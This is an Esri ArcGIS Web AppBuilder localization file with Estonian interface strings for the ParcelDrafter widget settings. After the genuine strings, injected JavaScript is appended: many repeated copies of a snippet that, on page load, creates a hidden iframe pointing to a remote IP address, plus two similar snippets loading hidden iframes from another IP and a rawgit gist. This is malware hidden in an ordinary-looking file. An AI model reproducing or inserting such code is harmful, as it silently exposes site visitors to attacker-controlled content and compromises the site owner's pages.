// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/ParcelDrafter/setting/nls/strings":{setBtnLabel:"M\u00e4\u00e4ra",selectLabel:"Vali",selectLayerLabel:"Vali maa\u00fcksuse kihid",selectLayerHintText:"Vihje: kasutage maa\u00fcksuse pol\u00fcgooni ja sellega seotud joonekihi valimiseks nuppu M\u00e4\u00e4ra",layerSelector:{selectedLayerNotHavingRelatedLayer:"Valitud pol\u00fcgoonikihil pole kehtivat seotud kihti."},parcelLineLayer:{selectLayerLabel:"Vali seotud joonekiht",layerSettingTabLabel:"Maa\u00fcksuse kihid",advancedSettingTabLabel:"T\u00e4psemad seaded",
selectLayerHintText:"Vihje: kasutage COGO v\u00e4\u00e4rtuste salvestamiseks maa\u00fcksuse joonekihile",selectFieldLegendLabel:"Valige v\u00e4ljad COGO v\u00e4\u00e4rtuste salvestamiseks maa\u00fcksuse joonekihile",bearingFieldLabel:"Kurss",chordLengthFieldLabel:"K\u00f5\u00f5lu pikkus",distanceFieldLabel:"Vahemaa",sequenceIdFieldLabel:"J\u00e4rjekorra ID",radiusFieldLabel:"Raadius",foreignKeyFieldLabel:"V\u00f5\u00f5ras v\u00f5ti",arcLengthFieldLabel:"Kaare pikkus",lineTypeFieldLabel:"Joone t\u00fc\u00fcp",
parcelPointSymbolLabel:"Maa\u00fcksuse punkti s\u00fcmbol",parcelPointSymbolHintText:"Vihje: kasutatakse joone alguspunkti s\u00fcmboli kuvamiseks.",symbolPickerPreviewText:"Eelvaade",selectLineLayerLabel:"Vali joonekiht"},parcelPolygonLayer:{selectPolygonLayerLabel:"Vali pol\u00fcgoonikiht",selectPolygonLayerHintText:"Vihje: kasutage valitud maa\u00fcksuse pol\u00fcgoonikihti",selectFieldLegendLabel:"Valige v\u00e4ljad maa\u00fcksuse pol\u00fcgooni atribuutide salvestamiseks",parcelNameLabel:"Maa\u00fcksuse nimi",
rotationLabel:"P\u00f6\u00f6ramine",planNameLabel:"Plaani nimi",scalingLabel:"Skaleerimine",documentTypeLabel:"Dokumendi t\u00fc\u00fcp",miscloseRatioLabel:"Sulgumisvea suhe",statedAreaLabel:"Esitatud pindala",miscloseDistanceLabel:"Sulgumisvea vahemaa",selectPolygonLayerLabelPopUp:"Vali m\u00f5ni pol\u00fcgoonikiht"},lineTypesTable:{lineTypeLabel:"Joone t\u00fc\u00fcp",valueLabel:"V\u00e4\u00e4rtus",symbolLabel:"S\u00fcmbol",connectionLineLabel:"\u00dchendusjoon",boundaryLineLabel:"Piirjoon"},closureSetting:{snappingLayerLabel:"Sn\u00e4pitavad kihid",
snappingBtnLabel:"M\u00e4\u00e4ra",snappingLayerHintText:"Vihje: valige kihid, mille k\u00fclge maa\u00fcksuse jooned sn\u00e4pivad.",miscloseDistanceLabel:"Sulgumisvea vahemaa",miscloseDistanceHintText:"Vihje: m\u00e4\u00e4rake sulgumisvea vahemaa ja \u00fchikud.",miscloseRatioLabel:"Sulgumisvea suhe",miscloseRatioHintText:"Vihje: m\u00e4\u00e4rake sulgumisvea suhe.",snappingToleranceLabel:"Sn\u00e4ppimise tolerants",pixelLabel:"Pikslid",snappingToleranceHintText:"Vihje: m\u00e4\u00e4rake sn\u00e4ppimise tolerants.",
selectLayerLabel:"Vali kiht"},errorMsg:{bearingFieldErrMsg:"Vigane kursiv\u00e4li",chordLengthErrMsg:"Vigane k\u00f5\u00f5lu pikkus",distanceFieldErrMsg:"Vigane vahemaa",sequenceIdFieldErrMsg:"Vigane j\u00e4rjekorra ID",radiusFieldErrMsg:"Vigane raadius",foreignKeyFieldErrMsg:"Vigane v\u00f5\u00f5ras v\u00f5ti",arcLengthFieldErrMsg:"Vigane kaare pikkus",lineTypeFieldErrMsg:"Vigane joone t\u00fc\u00fcp",parcelNameFieldErrMsg:"Vigane maa\u00fcksuse nime v\u00e4li",planNameFieldErrMsg:"Vigane plaani nime v\u00e4li",
scaleFieldErrMsg:"Vigane m\u00f5\u00f5tkava v\u00e4li",documentTypeFieldErrMsg:"Vigane dokumendit\u00fc\u00fcbi v\u00e4li",miscloseRatioFieldErrMsg:"Vigane sulgumisvea suhte v\u00e4li",statedAreaFieldErrMsg:"Vigane esitatud pindala v\u00e4li",miscloseDistanceFieldErrMsg:"Vigane sulgumisvea vahemaa v\u00e4li",globalIdFieldErrMsg:"Valitud pol\u00fcgoonikihil pole kehtivat 'esriFieldTypeGlobalID' v\u00e4lja.",invalidPolylineLayer:"Valige kehtiv maa\u00fcksuse murdjoonekiht",invalidPolygonLayer:"Valige kehtiv maa\u00fcksuse pol\u00fcgoonikiht",
invalidMiscloseDistance:"Sisestage kehtiv sulgumisvea vahemaa",invalidSnappingTolerance:"Sisestage kehtiv sn\u00e4ppimise tolerants",invalidMiscloseRatio:"Sisestage kehtiv sulgumisvea suhe",selectDistinctLineTypes:"Valige iga joone t\u00fc\u00fcbi jaoks erinev v\u00e4\u00e4rtus",invalidConnectionLineType:"Vigane \u00fchendusjoone v\u00e4\u00e4rtus",invalidBoundaryLineType:"Vigane piirjoone v\u00e4\u00e4rtus",selectDistinctPolylineFields:"Valige iga COGO v\u00e4\u00e4rtuse jaoks erinev v\u00e4li.",
selectDistinctPolygonFields:"Valige iga maa\u00fcksuse pol\u00fcgooni atribuudi jaoks erinev v\u00e4li."},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});